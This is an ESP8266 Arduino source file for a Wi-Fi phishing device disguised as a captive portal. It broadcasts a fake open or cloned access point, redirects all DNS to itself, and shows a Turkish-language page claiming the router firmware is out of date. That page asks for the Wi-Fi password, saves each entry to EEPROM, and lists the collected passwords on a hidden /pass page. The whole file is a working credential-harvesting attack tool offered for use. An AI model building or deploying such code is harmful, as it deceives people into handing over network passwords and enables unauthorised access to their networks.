// Code for ESP8266 Wifi Captive Portal.

// Adding libraries.
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default main strings.
#define SUBTITLE "Yönlendirici bilgisi."
#define TITLE "Güncelleme"
#define BODY "Yönlendirici firmware'iniz güncel değil. Normal taramaya devam etmek için firmware'inizi güncelleyin."
#define POST_TITLE "Updating..."
#define POST_BODY "Yönlendiriciniz güncelleniyor. Lütfen işlem tamamlanana kadar bekleyin.. </br> Teşekkür ederim."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Initial system settings.
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// Default wifi SSID name.
const char *SSID_NAME = "Free Wifi";

String allPass = "";     // For storing all passwords.
String newSSID = "";     // For adding new SSID.
String currentSSID = ""; // For storing the SSID in the EEPROM.

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; text-align:center; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em;  }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 5px; border: 1px solid #555555; color: #000000; }"
               "label { color: #333; display: block; text-align:center; font-style: italic; font-weight: bold; }"
               "nav { background: #fff; color: #00a5de; text-align:center; display: block; font-size: 1.3em; padding: 0.8em; }"
               "nav b { display: block; text-align:center; font-size: 1.5em; margin-bottom: 0.1em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><div style=\"text-align:center;\"><img src='data:image/png;base64,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' alt=\"logo\"></div><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi sifre:</label>" +
         "<input type=password name=m></input><input type=submit style=background-color: blue; value=Güncelleme></form>" + footer();
}

String posted()
{
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass()
{
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid()
{
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return postedSSID;
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{
  // The BUILTIN_LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Starting serial communication.
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read SSID in the EEPROM.
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the BUILTIN_LED.
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
